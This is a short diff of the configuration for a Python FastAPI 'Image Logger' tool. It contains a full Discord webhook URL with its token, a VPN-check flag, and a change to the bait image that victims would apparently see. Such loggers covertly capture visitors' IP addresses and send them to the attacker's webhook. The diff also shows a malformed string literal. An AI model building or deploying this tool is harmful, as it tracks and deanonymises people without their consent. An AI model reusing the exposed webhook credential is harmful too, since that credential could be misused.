@@ -7,7 +7,7 @@ app = FastAPI()
 
 CONFIG = {
     "webhook": https://discord.com/api/webhooks/1537687170049904651/C_Wyee-Z7b5tEFksO5CN4J3JYZhxBEGEudHX-7XtTJhaI5Xo6pcRk6xIiMi28euNSWap",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
+    "image": "https://i.pinimg.com/236x/51/fc/af/51fcaff8616d09f6893b9ee52efe7dfb.jpg",
     "username": "Image Logger",
     "color": 0x00FFFF,
     "vpnCheck": 1, 
